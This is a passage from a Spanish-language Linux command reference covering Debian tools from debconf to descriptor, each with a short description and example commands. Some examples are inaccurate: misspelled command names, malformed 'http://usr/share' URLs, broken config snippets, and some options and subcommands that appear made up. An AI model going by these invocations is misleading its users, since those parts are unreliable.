	ChangeLog.2007-2015  configure.ac  INSTALL       mkinstalldirs  src


debconf
Es un sistema de configuración para paquetes Debian. Debconf proporciona una interfaz consistente para configurar paquetes, permitiéndo elegir entre varias interfaces de usuario. Permite preconfigurar paquetes antes de instalarlos.
$ debconf -f readline sh -x script.sh (con la interfaz [f] y la orden de ejecución [x] para el script mencionado)


debdate
Convertir fechas gregorianas en fechas respecto de las versiones de Debian.
	$ debdate -d 2020-05-20
	Today is day 141 of year 2 of the Buster
$ debdate


debdelta
Herramienta diseñada para calcular cambios entre paquetes Debian. Significa que en lugar de descargar un paquete completo, solo se descarga el cambio necesario entre la versión actual instalada y la nueva versión disponible.
# debdelta-upgrade (actualizar la base de datos buscando en los servidores los paquetes instalados y las versiones nuevas, descargando solo los cambios)
# debdelta download vim (conseguir un delta especifico para un paquete)
# debdelta paquete_1.0.deb paquete_1.1.deb (generar un archivo delta que contiene los cambios entre las dos versiones)
# debpatch vim_8.1.deb vim_8.1-to-8.2.delta  (aplicará el delta al paquete original, generando la nueva versión sin tener que descargar el paquete)
# debdelta-clean (elimina los archivos delta que ya no son necesarios)


debfoster
Mantiene una lista de paquetes instalados que fueron explícitamente solicitados en lugar de ser instalados como una dependencia. Los argumentos son totalmente opcionales y debfoster puede ser invocado después de lanzar dpkg y/o apt-get.
# debfoster
Las opciones son:
       y (guardar paquete. opción por defecto)
       n (borrar paquete)
       p (que también elimine todos los paquetes que sólo están instalados porque este paquete depende de ellos. Si los hubiera se muestran en la parte superior de la ventana)
       s (omitir pregunta. La próxima vez que se ejecute preguntará de nuevo sobre este paquete)
       h (imprimir mensaje de ayuda)
       i o ? (mostrar información sobre el paquete)
       u (deshacer la última opción)
       q (salir sin quitar paquetes. Todos los cambios se perderán)
       x (Guardar cambios, eliminar los paquetes no deseados y salir)
# debfoster -u (recargar la base de datos)


debget
[debian-goodies]. Descarga un paquete .deb del repositorio o, caso de estar instalado, muestra la versión.
$ debget scribus
$ debget chromium


debian-faq
Preguntas más frecuentes con sus respuestas sobre la distribución de Debian GNU/Linux y sobre el proyecto Debian. El documento está disponible en https://www.debian.org/doc/manuals/debian-faq/. Puede accederse a él con el navegador en la dirección:
	file:///usr/share/doc/debian/FAQ/index.en.html


debian-goodies
Conjunto de herramientas diseñadas para integrarse con la shell estándar, extendiéndola para operar en el sistema de empaquetado de Debian. Algunas de las dependencias de algunos paquetes que intégran esta aplicación son opcionales, sugeridas o obligatorias. Los paquetes que integra son: check-enhancements, debget, debman, debmany, degrep, dfgrep, dglob, dgrep, dhomepage, dman, dpigs, dzegrep, dzfgrep, dzgrep, find-dbgsym-packages, popbugs, which-pkg-broke, which-pkg-broke-build y checkrestart.


debian-handbook
Accesible para todos, el Manual del administrador de Debian enseña los aspectos esenciales a todo aquel que quiera convertirse en un administrador de Debian GNU/Linux eficaz e independiente. Abarca todos los temas que un administrador competente de Linux debería dominar, desde la instalación y actualización del sistema, hasta la creación de paquetes y la compilación del núcleo, pero también la monitorización, las copias de seguridad y la migración, sin olvidar temas avanzados como la configuración de SELinux/AppArmor para proteger servicios, instalaciones automatizadas o virtualización con Xen, KVM o LXC. El Manual del administrador de Debian ha sido escrito por dos administradores de Debian.
$ firefox file:///usr/share/doc/debian-handbook/html/


debian-history
Historia de la distro Debian. Los idiomas disponibles son: Inglés, francés, alemán, italiano, japonés, coreano, portugués, ruso y lituano. Colocar en la barra de navegación [para el idioma francés]:
	http://usr/share/doc/debian-history/fr/index.fr.html


debian-info
Muestra las versiones de las distros debian y ubuntu.
$ debian-info --all (de todas)
$ debian-info --stable (la última versión estable)
$ debian-info --testing (la última versión testing)


debian-reference
Esta referencia de Debian está destinada a proporcionar una visión general del sistema Debian como una guía del usuario posterior a la instalación. Acceder a ella entrando en el navegador:
file:///usr/share/debian-reference/apa.es.html


debian-security-support
Para algunos paquetes Debian, no es posible mantener un soporte de seguridad completo para todos los casos de uso durante todo el ciclo de lanzamiento de la distribución. Este paquete proporciona un programa para identificar los paquetes instalados para los que se ha tenido que limitar o finalizar prematuramente el soporte y para alertar al administrador. Se proporcionarán nuevas versiones de este paquete con listas de verificación actualizadas a través del soporte de seguridad estándar y/o extendido.
$ debian-security-support check openssh-server (verificar el soporte de seguridad para un paquete)
$ debian-security-support list --unsupported (listar todos los paquetes sin soporte completo de seguridad)
$ debian-security-support list --limited (paquetes con soporte limitado de seguridad)
$ debian-security-support info openssh-server (mostrar detalles detallados de un paquete específico)


debian-timeline
Línea de tiempo del proyecto Debian basado en Javascript y HTML: Versiones, bugs, lanzamientos importantes... Colocar en la barra de navegación:
	http://usr/share/debian-timeline/index.html


debianutils
Proporciona una serie de pequeñas utilidades que son utilizadas principalmente por los scripts de instalación de paquetes Debian, aunque pueden usarse directamente. Dichas utilidades son:
ischroot, savelog, which.debianutils, add-shell, remove-shell y update-shells.


debmirror
Este programa descarga y mantiene un espejo local parcial de Debian. Puede reflejar cualquier combinación de arquitecturas, distribuciones y secciones. Los archivos se transfieren por FTP, HTTP, HFTP o rsync, y los grupos de paquetes son totalmente compatibles. También realiza el bloqueo y actualiza los archivos de seguimiento.
# debmirror --method http --host ftp.debian.org --dist sid --dir /var/spool/apt-mirror/mirrors/sid --arch "amd64 i386" --ignoremissing --noverbose (crea un espejo del repositorio "sid" [desarrollo] para arquitecturas amd64 e i386 en el directorio especificado)
# debmirror --method http --host ftp.debian.org --dist bullseye --dir /var/spool/apt-mirror/mirrors/bullseye --arch amd64 --components main contrib non-free --ignoremissing --noverbose (crea un espejo más específico y detallado de Bullseye para la arquitectura amd64, incluyendo los componentes main, contrib y non-free)
Las opciones:
    --method: Especifica el método de acceso (http, ftp, etc.)
    --host: Dirección del servidor del repositorio
    --dist: Nombre del repositorio (por ejemplo, "bullseye", "stable", "unstable")
    --dir: Directorio local donde se almacenará el espejo
    --components: Los componentes que incluye [main, contrib y non-free]
    --arch: Arquitecturas a incluir
    --ignoremissing: Ignora paquetes que ya existen en el espejo
    --noverbose: Reduce la cantidad de información mostrada durante la ejecución


debomatic
Es una máquina de compilación fácil de usar para paquetes fuente de Debian basada en sbuild y schroot, escrita en Python. Proporciona una herramienta simple para automatizar la compilación de paquetes fuente con interacción limitada del usuario y una configuración simple. Tiene algunas características útiles como actualización automática de chroots, escaneo automático y selección de paquetes fuente para compilar y compatibilidad con módulos. Está pensada para ayudar a los desarrolladores a compilar sus paquetes sin preocuparse demasiado por la compilación, ya que se ejecutará en segundo plano y no se requiere retroalimentación del usuario durante todo el proceso. Primero el archivo de configuración:
# nano /etc/debomatic/main
  [default]
  builder: pbuilder
  packagedir: /home/usuario/debomatic
  configdir: /etc/debomatic/distributions
  maxbuilds: 3
  inotify: 1
  sleep: 60
  logfile: /var/log/debomatic.log
  gpg: 1 # Para habilitar el control de firmas
  gpgkey: /ruta/a/tu/clave_privada.asc
  [distributions]
  unstable:
    dist: sid
    arch: amd64
  testing:
    dist: bullseye
    arch: arm64
# debomatic add <nombre-del-paquete> (agregar un nuevo paquete a construir)
# debomatic start (iniciar los procesos de construcción)
# debomatic stop (parar los procesos)
# debomatic status (ver el estado actual)
# debomatic remove <nombre-del-paquete> (eliminar un paquete de la cola)


debootstrap
Instalar un sistema Debian dentro de un directorio de nuestro sistema para hacer pruebas o realizar instalaciones de otra arquitectura diferente.
# mkdir /mnt/debian-i386/ (Crear el directorio)
# debootstrap --arch=i386 wheezy /mnt/debian-i386/ http://ftp.debian.org/debian/
# chroot /mnt/debian-i386 (Entrar en el nuevo sistema. Ver chroot)
Nota.- mmdebstrap [ver] es más rápido y eficiente, ya que usa apt internamente, maneja mejor las dependencias, permite más opciones de personalización y es más moderno que debootstrap.


debootstick
Convierte un entorno chroot en una imagen de arranque. Esto significa que se puede tomar una instalación de Linux ya configurada por ejemplo, en una partición y convertirla en una imagen ISO que se pueda usar copiándola en un USB o disco, como un disco de arranque.
# debootstick --format=iso /dev/sdX1 output.iso (crea una imagen de arranque desde una instalación existente)
# debootstick --device=/dev/sdX output.iso (escribirá la imagen ISO en el dispositivo /dev/sdX)
# debootstick --status (verificar el estado del proceso)


deborphan
Visualizar paquetes huerfanos
$ deborphan --guess-all   (Los muestra todos)
# apt-get remove $(deborphan --guess-all)     (borra todos los mostrados)
# deborphan        (para ver las librerias huérfanas)
# dpkg -l $(deborphan)    (lo mismo que el anterior con más detalles)
# sudo dpkg --purge $(deborphan)   (eliminar los paquetes huérfanos)
	# apt-get remove `deborphan` (Lo mismo)
# dpkg -l $(deborphan --find-config)  (para borrar configuraciones que no se han borrado tras la desinstalación de un paquete)
# dpkg --purge $(deborphan --ind-config)  (para eliminarlos)
# apt-get remove $(deborphan --guess-all)
Nota.- Normalmente estas aplicaciones han de repetirse varias veces hasta que al lanzar el comando no salga ninguna archivo huerfana.
# deborphan | xargs sudo apt-get -y remove --purge (otra forma de eliminar paquetes huerfanos)


debos
Crear imágenes de sistemas operativos basados en Debian de manera flexible y modular. Está diseñado para desarrolladores y administradores que necesitan personalizar imágenes para entornos específicos, como dispositivos embebidos, servidores, o entornos de prueba.
Ejemplo básico de un archivo recipe.yaml:
        architecture: arm64
              actions:
                - action: debootstrap
                  suite: buster
                  mirror: http://deb.debian.org/debian
                - action: apt
                  packages:
                    - openssh-server
                    - curl
                    - wget
                - action: overlay
                  source: ./overlay
                - action: filesystem
                    filetype: ext4
                    partitiontype: gpt
                    size: 2G
architecture: Especifica la arquitectura del sistema operativo (por ejemplo, amd64, arm64, etc.).
debootstrap: Descarga e instala un sistema Debian básico desde un espejo especificado.
apt: Instala paquetes adicionales en la imagen (en este caso, vim, curl y wget).
overlay: Copia archivos desde un directorio local (./overlay) hacia la imagen creada.
filesystem: Configura el sistema de archivos de salida como ext4 con un tamaño de 2 GB.
$ debos recipe.yaml (generará una imagen en la arquitectura y configuración especificadas)


debpear
Construye e instala automáticamente paquetes PEAR [PHP Extension and Application Repository] como si fueran paquetes Debian. Se puede instalar paquetes PEAR a partir del nombre de un módulo PEAR de PHP. Debpear descargará, creará y construirá un paquete Debian a partir del paquete pear que se haya seleccionado y, finalmente, lo instalará en el sistema. También funciona buscando los paquetes PEAR equivalentes en el repositorio de Debian y los instala automáticamente ya que los paquetes PEAR suelen tener su propia forma de instalación y gestión, lo que puede complicar su administración en un sistema que utiliza apt para su gestión.
# debpear install Mail (buscará el paquete Mail en el repositorio PEAR y lo convertirá en un paquete Debian para su instalación. Si ya existe lo actualizará y si hay una versión más reciente, la instalará )
# apt-get remove php-pear-Mail (desinstalar el paquete php-pear-Mail que es el nombre del paquete Debian que fue creado a partir del paquete PEAR)


debram
[Debian Reference and Archive Management]. Catálogo ramificado de comandos disponibles. Debian GNU/Linux ofrece miles y miles de comandos. Al clasificarlos en clases amplias y luego dividirlos y redividirlos en ramas más finas y específicas, Debram ramifica los comandos de Debian de la misma manera que una biblioteca universitaria ramifica sus libros. Si sabe lo que quiere que haga su computadora pero aún no conoce el comando para hacerlo, puede encontrarlo aquí. (El paquete Debram solía incluir también --de hecho principalmente-- una ramificación mucho más grande e importante de *paquetes* Debian, junto con una herramienta de navegación; pero Debtags ha reemplazado a Debram en esos aspectos. Lo que el paquete Debram aún incluye es la Guía de selección de comandos, que aunque algo desactualizada todavía puede ser útil).
$ zcat /usr/share/doc/debram/cmdsel.txt.gz > cmdsel.txt
$ firefox cmdsel.txt (ver el contenido del archivo)


debroster
inicia un eterm con el logotipo de Debian como fondo, con una lista aleatoria de los desarrolladores actuales desplazándose desde arriba de la pantalla.
$ debroster


debsecan
Efectúa una evaluación de seguridad del sistema y muestra las vulnerabilidades conocidas y asociadas a los paquetes instalados, notificando al administrador (root) los resultados.
# debsecan-create-cron (ejecutar diariamente)
# dpkg-reconfigure debsecan (realizar una correcta configuración)
# debsecan  --suite buster --format report --update-history (escaneos)
# debsecan  --suite buster --only-fixed (otro tipo de escaneo)
# debsecan --update-history (actualizar el archivo histórico después de la presentación de informes)


debsigs
Herramienta que permite firmar criptográficamente paquetes .deb utilizando GPG. La firma se incorpora directamente dentro del archivo .deb, lo que asegura la integridad y autenticidad del paquete al permitir verificar su procedencia. Estas firmas pueden verificarse posteriormente mediante herramientas de recuperación e instalación de paquetes para garantizar la autenticidad de los contenidos del paquete.
# debsigs --sign=origin -k [ID_CLAVE] paquete.deb (firmado como el originador del paquete y con la ID de la clave GPG utilizada para firmar. Si no se proporciona, usa clave predeterminada)
# debsigs --verify paquete.deb (mostrará información sobre la validez de las firmas del paquete)
# debsigs --check paquete.deb (comprobar si un paquete tiene una firma válida)
# debsigs --sign=maint -k [ID_CLAVE] paquete.deb (agregar una firma de mantenedor del paquete)
$ ar t paquete.deb (ver los componentes del paquete, incluidas las secciones de firma)


debsums
Verificar la integridad de los ficheros.
# debsums -s &> log.txt  (Modo silencioso [-s] y redirigiendo el resultado a un archivo para posterior análisis)
# cat log.txt | grep "mismatch" | cut -d " " -f4 | uniq > reinstall.txt (A partir del archivo anterior, listar los que se han de reinstalar)
# debsums -s | grep "mismatch" | cut -d " " -f4 | uniq > reinstall.txt (Lo mismo)
# apt-get install --reinstall `(cat reinstall.txt)`  (para instalarlos a partir del listado)


debtags
Herramientas de soporte para etiquetas de paquetes de Debian. debtags extrae información de etiquetas de la base de datos de apt y la pone a disposición del sistema, ya sea en /var/lib/debtags/package-tags o a través de apt-xapian-index. Las etiquetas de paquetes son categorías para los paquetes de Debian. debtags también proporciona algunos comandos útiles para consultar información de etiquetas.
$ debtags cat | less (todo el listado de comandos)
$ debtags dumpavail  | less
$ debtags check (Comprueba que todas las etiquetas en la colección estén presentes en el vocabulario de etiquetas)
$ debtags tagcat (Muestra el vocabulario de etiquetas)
$ debtags search interface::commandline (busca paquetes etiquetados como interface::commandline [que tienen interfaz de línea de comandos])
$ debtags tagshow interface::commandline (información sobre una etiqueta)
# debtags update (actualizar la base de datos local de etiquetas)
$ debtags search "role::program && devel::editor" (encuentra paquetes que sean programas role::program y que estén relacionados con edición de desarrollo devel::editor)


debtree
Genera gráficos en forma de archivo .dot de las dependencia de un paquete .deb.
$ deptree apt > apt.dot
$ dot -Tpng -o apt.png apt.dot (crear el png con dot)
$ gpicview apt.png (visualizar el gráfico generado con deptree)


debugfs
Depurador de sistemas ext. Permite consultar datos del sistema en tiempo real.
# debugfs (Entra en el promt de la aplicación. Pulsar letra "q" para salir del promt)
  debugfs 1.42 (29-Nov-2011)
  debugfs: help (Muestra un listado de todas las opciones)
  debugfs: open /dev/sda2 (Abre un sistema de archivos)
  debugfs: stats (información de los superbloques)
# debugfs /dev/hda4
# debugfs -R 'stat <1706790>' /var/log/syslog
Nota.- El nodo lanzando:
       # stat /var/log/syslog


debvm
Herramienta que se usa para facilitar la creación y ejecución de entornos de prueba aislados para software en sistemas basados en Debian. Utiliza QEMU, un emulador y virtualizador de hardware, para crear estos entornos de forma que las pruebas se realicen en un entorno controlado sin interferir con el sistema operativo principal. Incluye las herramientas debvm-create y debvm-run.
$ debvm-create my-test-vm (generará una máquina virtual llamada my-test-vm con la configuración predeterminada)
$ debvm-run my-test-vm -- sudo apt-get install nombre-del-paquete (ejecutará el comando de instalación dentro de la máquina virtual, de manera que no afecte al sistema base)
$ debvm-run my-test-vm -- ./script.sh (ejecutará script.sh dentro de my-test-vm, permitiéndo observar el comportamiento de la aplicación en un entorno controlado)


declare
Listar las variables de entorno. En caso de que una función tenga el mismo nombre que un script tiene preferencia la función. Usado principalmente en scripts.
$ declare -f (Imprime las funciones alfabeticamente y su definición)
$ declare -f funcion (Mostrará la especificada)
$ declare -F (Lista sólo los nombres de la funciones)
$ declare -p var (Saber el tipo de la variable "var")
$ declare -i var=5 (Declarar una variable de tipo entero)


decode-dimms
Herramienta para decodificar la información que se encuentra en las EEPROMs SPD de los módulos de memoria. La herramienta requiere que se cargue un módulo del núcleo: eeprom, at24 o ee1004 (para DDR4 SDRAM.)
$ decode-dimms (información por pantalla)
$ decode-dimms -f (en formato .html)


decopy
Automatiza la escritura y actualización del archivo debian/copyright. Lee todos los archivos en el árbol de código fuente, analiza las licencias y los mensajes de copyright incluidos y genera el archivo debian/copyright correspondiente.
Cuando el archivo ya existe, decopy lo analiza para generar una salida más completa.
$ decopy --copyright /ruta/al/paquete/debian/copyright (actualiza y muestra el archivo copyright)


deepin-terminal
Emulador de terminal avanzado con espacio de trabajo, múltiples ventanas, administración remota y otras características.
$ deepin-terminal


deets
Herramienta de administración descentralizada basada en modelos. Deets ofrece una forma de administrar paquetes y archivos Debian en sus sistemas utilizando archivos de configuración basados en Lua. Un intérprete especializado de Lua llamado luau es capaz de validar sus especificaciones y, opcionalmente, hacerlas cumplir. Además, puede escanear su sistema y generar una configuración de modelo básica basada en el estado actual de la base de datos de paquetes Debian y todos los archivos de configuración.
$ luau --no-audit --rectify --report /usr/share/deets/inventory.lua > /tmp/model.lua (mardar el informe al archivo /tmp/model.lus)
$ luau /tmp/model.lua (ver el resultado)
Opciones:
        audit (informar el índice de conformidad, predeterminado)
        rectify (hacer que el sistema cumpla con el modelo)
        report (imprimir lo que --rectify debe hacer)
        dep-trace (mostrar el orden de las dependencias)
        delete-tmpdir (eliminar deets tmpdir, predeterminado)
Cualquier opción puede tener como prefijo 'no' para deshabilitarla, por ejemplo: --no-audit


defaults
Permite leer y modificar los valores predeterminados de un usuario. Este programa reemplaza los antiguos programas dread, dwrite y dremove. Si se tiene acceso a la base de datos predeterminada de otro usuario, se puede incluir '-u nombre de usuario' antes de cualquier otra opción para usar la base de datos de ese usuario en lugar de la suya.
$ defaults readkey key (leer nombre predeterminado de todos los dominios)
$ defaults write domain key 'value' (escriba 'value' como 'key' predeterminada en el dominio [entre comillas simples])
$ defaults write domain dictionary (escriba 'diccionary' como reemplazo del dominio especificado. 'diccionary' debe ser una lista de propiedades entre comillas simples)
$ defaults write (lee la entrada estándar para valores predeterminados y los escribe en la base de datos)
$ defaults delete [ domain [ key] ] (eliminar los valores predeterminados especificados del 'domain'. Si no se proporciona ninguna 'key', elimine todo el dominio)
$ defaults delete (eliminar los valores predeterminados)
$ defaults domains (enumera los dominios en la base de datos uno por línea)
$ defaults find word (busca nombres de dominio, nombres predeterminados y cadenas de valores predeterminados iguales a la palabra 'word' y los enumera por pantalla)
$ defaults plist (información sobre las listas de propiedades)
$ defaults help (lista de opciones)


defmt-sh
Permite usar ispell con la opción -F para verificar scripts de shell y cualquier otro lenguaje que use "#" para comentarios y mismos estilos de comillas como C y C++ pero en este caso habla que usar el programa defmt-c
$ ispell -F defmt-sh (para scripts shell)
$ ispell -F defmt-c (para C y C++)


dehydrated
Cliente ACME que permite firmar certificados con un servidor ACME, como el que proporciona la autoridad de certificación Let’s Encrypt [letsencrypt.org]. Permite automatizar la generación, renovación y gestión de certificados TLS/SSL. El protocolo ACME [Automated Certificate Management Environment], escrito en Bash permite obtener automáticamente certificados de confianza para el navegador. En primer lugar, personalizar las opciones:
# nano /etc/dehydrated/config
       CONFIG_D=/etc/dehydrated/conf.d
       BASEDIR=/var/lib/dehydrated
       WELLKNOWN="${BASEDIR}/acme-challenges"
       DOMAINS_TXT="/etc/dehydrated/domains.txt"
       CA=letsencrypt.org
       CONTACT_EMAIL=user@gmail.com
Crear el archivo de dominios y subdominios, a modo de ejemplo:
# nano /etc/dehydrated/domains.txt
example.org
example.com www.example.com
example.net www.example.net wiki.example.net
$ dehydrated --register --accept-terms (aceptar los términos del servicio y registrar la cuenta con el servidor ACME)
$ dehydrated --cron (emitir certificados para los dominios listados en domains.txt, validar los dominios y generar certificados en /var/lib/dehydrated/certs/)
# dehydrated --force --cron (forzar la renovación de un certificado)
# dehydrated --cleanup (eliminar certificados)
# dehydrated --list (verificar los certificados gestionados)
1.-
Para renovar certificados automáticamente.
Let's Encrypt recomienda renovar certificados al menos cada 60 días.
# crontab -e
Y agregar la linea:
          0 2 * * * /usr/bin/dehydrated --cron >> /var/log/dehydrated.log 2>&1
2.-
Para validación HTTP-01 (requiere que se pueda colocar un archivo en el servidor web), colocar un archivo en la carpeta pública del servidor web para manejar esto automáticamente. Un ejemplo de hook sería:
# nano /etc/dehydrated/hook.sh
deploy_challenge() {
    local DOMAIN="${1}" TOKEN_FILENAME="${2}" TOKEN_VALUE="${3}"
    mkdir -p /var/www/html/.well-known/acme-challenge
    echo "${TOKEN_VALUE}" > /var/www/html/.well-known/acme-challenge/${TOKEN_FILENAME}
}
clean_challenge() {
    local DOMAIN="${1}" TOKEN_FILENAME="${2}" TOKEN_VALUE="${3}"
    rm -f /var/www/html/.well-known/acme-challenge/${TOKEN_FILENAME}
}
Luego especificar este hook en el archivo de configuración añadiendo la linea:
# nano /etc/dehydrated/config
       HOOK=/etc/dehydrated/hook.sh
3.-
Para validación DNS-01 que requiere crear registros DNS específicos, se necesita un script para actualizarlos. Por ejemplo:
# nano validación.sh
deploy_challenge() {
    local DOMAIN="${1}" TOKEN_FILENAME="${2}" TOKEN_VALUE="${3}"
    echo "Añade este registro DNS:"
    echo "_acme-challenge.${DOMAIN} IN TXT \"${TOKEN_VALUE}\""
}
Nota.- Archivos importantes de los certificados son los directorio /var/lib/dehydrated/certs


dehydrated-apache2
Utilidad para la obtención de certificados SSL/TLS a través del protocolo ACME [Automatic Certificate Management Environment], que es utilizado por Let's Encrypt y otros proveedores de certificados. La instalación de este paquete junto con dehydrated [ver] es suficiente para tener un cliente ACME completamente funcional para el servidor web Apache2. Se encarga de gestionar las respuestas a los desafíos http-01 que dehydrated envía al servidor. Es decir, cuando dehydrated necesita verificar que tienes control sobre un dominio, el paquete dehydrated-apache2 asegura que Apache pueda responder adecuadamente a la solicitud de verificación.
Configuración inicial:
# mkdir -p /etc/dehydrated (crear el directorio donde almacenar la configuración)
# cd /etc/dehydrated
# nano config (crear el archivo de configuración con el siguiente ejemplo de contenido)
           CA="https://acme-v02.api.letsencrypt.org/directory"
           ACCOUNT_KEY="account.key"
           CHALLENGE="http-01"
           DOMAINS_TXT="domains.txt"
# dehydrated -c (iniciará el proceso de obtención del certificado)


dehydrated-hook-ddns-tsig
[dehydrated]. Implementa la validación del desafío DNS-01, que requiere que el propietario de un dominio demuestre el control sobre él mediante la creación de un registro TXT en el DNS. Este script utiliza la biblioteca dnspython para realizar actualizaciones dinámicas de DNS mediante el mecanismo TSIG [Transaction SIGnature], que asegura la autenticidad de las actualizaciones, creando un registro TXT temporal para el dominio determinado, lo que demuestra la propiedad del dominio. Requiere un servidor DNS capaz de realizar actualizaciones dinámicas de DNS, como bind9.
Se necesita un archivo de configuración especificando los detalles del servidor DNS y la clave TSIG. Unejemplo:
# nano /etc/dehydrated/hook-config.sh
      DNS_SERVER="ns.example.com"          # Servidor DNS
      DNS_PORT="53"                        # Puerto DNS (53 por defecto)
      TSIG_KEY_NAME="update-key"           # Nombre de la clave TSIG
      TSIG_KEY="abcd1234=="                # Valor base64 de la clave TSIG
      TSIG_ALGORITHM="hmac-sha256"         # Algoritmo TSIG (por ejemplo, hmac-sha256)
1.-
Crear y probar un registro TXT temporal, por ejemplo para validar el dominio example.com se puede usar el hook para crear el registro TXT temporal requerido por el desafío:
$ export HOOK_CONFIG=/etc/dehydrated/hook-config.sh
$ dehydrated-hook-ddns-tsig add _acme-challenge.example.com "some_random_string"
Esto conectara con el servidor DNS especificado en el archivo de configuración y creará un registro TXT llamado _acme-challenge.example.com con el valor some_random_string. Una vez que el servidor de Let's Encrypt confirme la propiedad, se puede eliminar el registro con:
$ dehydrated-hook-ddns-tsig clean _acme-challenge.example.com "some_random_string"
2.-
Integración con Dehydrated mediante un script que puede ser utilizado como un hook durante el proceso de solicitud de certificados. Por ejemplo:
# nano /etc/dehydrated/hooks/ddns-hook.sh
#!/bin/bash
#
HOOK_CONFIG=/etc/dehydrated/hook-config.sh
export HOOK_CONFIG
#
        case "$1" in
            deploy_challenge)
            dehydrated-hook-ddns-tsig add "$2" "$4"
        ;;
        clean_challenge)
            dehydrated-hook-ddns-tsig clean "$2" "$4"
        ;;
        *)
            echo "Unknown hook command: $1"
            exit 0
        ;;
        esac
Este hook llama a dehydrated-hook-ddns-tsig para añadir o eliminar registros TXT según sea necesario.


dejagnu
Es un marco de trabajo para ejecutar conjuntos de pruebas en herramientas de software y probar otros programas. Su propósito es proporcionar una única interfaz para todas las pruebas. DejaGnu proporciona una capa de abstracción que permite escribir pruebas que sean portables a cualquier host o destino donde se deba probar un programa.
Un archivo típico de configuración podría tener el siguiente contenido:
# nano /etc/dejagnu/site.exp
           set test_program "/usr/local/bin/gestrac"
           set timeout 300
Y el de pruebas que se han de ejecutar:
# nano /etc/tests.exp
      load_libs
      set tests {
        "test_case_1" {
            # Comando a ejecutar
            exec $test_program arg1 arg2
            # Verifica la salida
            set result $?
            if {$result != 0} {
                fail "test_case_1 failed"
            } else {
                pass "test_case_1 passed"
            }
        }
# runtest (ejecutar las pruebas y ver los resultados directamente en la terminal, donde se indicará si cada prueba pasó o falló)


deken
Gestor de paquetes diseñado para trabajar con paquetes Pure Data [Pd] en sistemas basados en Debian. Facilita la creación y carga de sus propios paquetes al repositorio oficial puredata.info.
$ deken new my-pd-package.pd (crear un nuevo paquete a partir de un archivo Pd)
$ deken upload /ruta/al/mi-paquete.pd (cargar un paquete existente al repositorio)
$ deken update (actualizar la base de datos local de paquetes)
$ deken search my-pd-package (buscar paquetes por nombre)
$ deken install my-pd-package (instalar un paquete Pd en el repositorio oficial)


delay
Herramienta que introduce un retardo constante entre la entrada estándar [stdin] y la salida estándar [stdout]. Los datos de su entrada estándar se almacenarán hasta que se hayan escrito en la salida estándar.
$ echo -e "Linux es un sistema genial" | delay 2s (tarda 2 segundos en mostrar la frase)
$ (echo "Hola"; sleep 1; echo "Mundo") | delay 2s (empezar a reproducir el comando inicial 2 segundos)


delgroup
Elimina un grupo del sistema
# delgroup grupo


delpart
Pide al núcleo Linux que se olvide de un dispositivo en la partición especificada (un número). Este comando no manipula particiones.
# delpart dispositivo partición


delta
Reduce un archivo, por ejemplo, de texto, JSON, o código fuente, eliminando partes innecesarias. El objetivo es que el archivo reducido siga causando determinado comportamiento, como un error, un fallo en un programa o un resultado relevante para la prueba usando reglas o aproximaciones [heurísticas] que son las que deciden qué partes del archivo se pueden eliminar sin perder el "interés" del archivo. Un archivo es "interesante" si causa un comportamiento específico, como un fallo en un programa, un error de compilación, o reproduce un error que estamos investigando. Supongamos que se tiene un archivo de código fuente muy grande [program.c] y se descubre que al compilarlo, el compilador muestra un error inesperado. Usar delta ayudará a reducir ese archivo al mínimo tamaño que sigue provocando el mismo error. Un ejemplo:
$ delta test.c -- gcc test.c
delta probará diferentes versiones reducidas de test.c eliminando líneas o bloques de código. Cada vez que elimina algo, ejecuta gcc test.c para verificar si el archivo reducido sigue causando el error. El proceso termina cuando encuentra la versión más pequeña de test.c que provoca el mismo error.
Algunas opciones útiles:
        --keep-tmp: No elimina los archivos temporales generados durante la minimización. Útil para analizar el proceso.
        --timeout=N: Termina la prueba si toma más de N segundos. Esto evita que un comando lento bloquee la minimización.
        --cpus=N: Usa N núcleos de CPU para acelerar el proceso.


deltarpm
Herramienta que contiene las diferencias entre una versión antigua y una nueva de un RPM [Red Hat Package Manager]. Esto hace posible recrear el nuevo RPM a partir del deltarpm y el RPM antiguo. En Debian y sistemas derivados, estas herramientas pueden ser útiles para crear y mantener repositorios de paquetes RPM utilizados por administradores de sistemas que trabajan con múltiples formatos de paquetes o que necesitan compatibilidad entre diferentes distribuciones.
$ deltarmp --old-version=1.0-1.el7.x86_64.rpm --new-version=1.1-1.el7.x86_64.rpm > cambios.deltarpm (compara las dos versiones epecificados y genera un archivo llamado "cambios.deltarpm" con las diferencias)
$ rpm --repackage cambios.deltarpm -o nuev-paquete-1.1-1.el7.x86_64.rpm (crea un nuevo paquete RPM basado en el deltarpm generado anteriormente)
$ rpm -qp --changelog cambios.deltarpm (muestra la lista de cambios incluidos en el deltarpm)


deluser
Elimina un usuario del sistema sin borrar su directorio.
# deluser usuario


delv
Utilidad de búsqueda y validación DNS. La aplicación enviará a un servidor de nombres especificado todas las consultas necesarias para obtener y validar los datos solicitados. La forma básica de ejecución es:
$ delv servidor nombre tipo (el servodor puede ser una dirección IP, una dirección IPv4 en notación decimal con puntos o una dirección IPv6 en notación delimitada por dos puntos. El nombre es el nombre de dominio que debe buscarse. El tipo de consulta puede ser cualquiera válido [ANY, A, MX, etc]. Si no se proporciona ninguno realizará una búsqueda de un registro A)


denyhosts
Protege contra ataques.
Configuración:
# nano /etc/denyhosts.conf
Algunas opciones:
	SECURE_LOG = /var/log/auth.log (Ruta a los logs)
	DENY_THRESHOLD_INVALID = 5 (Intentos fallidos permitidos con una cuenta que no existe)
	DENY_THRESHOLD_VALID = 5 (Intentos falllidos con usuarios validos)
	PURGE_DENY =5d (Tiempo de baneo de una IP. 5 dias en este caso)
	BLOCK_SERVICE = sshd (Servicios que queremos proteger [ sshd, ALL...)
Nota.- Tambien es posible arrancar el servicio con la opción "purge"  [/etc/init.d/denyhosts start --purge] para eliminar las ips bloqueadas y que se muestran en /etc/hosts.deny


depmod
Analiza los módulos del núcleo [/lib/modules/*] y crea una lista de dependencias. De forma predeterminada, esta lista se escribe en módulos.dep y una versión binaria con hash denominada módulos.dep.bin, en el mismo directorio.
$ depmod -a (Sondear todos los módulos. Opción predeterminada si no se proporcionan nombres de archivo en la línea de comandos)


descriptor
Toda aplicación tiene siempre tres descriptores de fichero abiertos, el 0 para la entrada estándar [stdin], el 1 para la salida estándar [stdout], y el 2 para la salida de errores estándar [stderr]. Del 3 al 9 son descriptores adicionales [ver tuberias].
$ ls -l /proc/self/fd (contiene un enlace simbólico para cada descriptor de archivo abierto por la terminal)
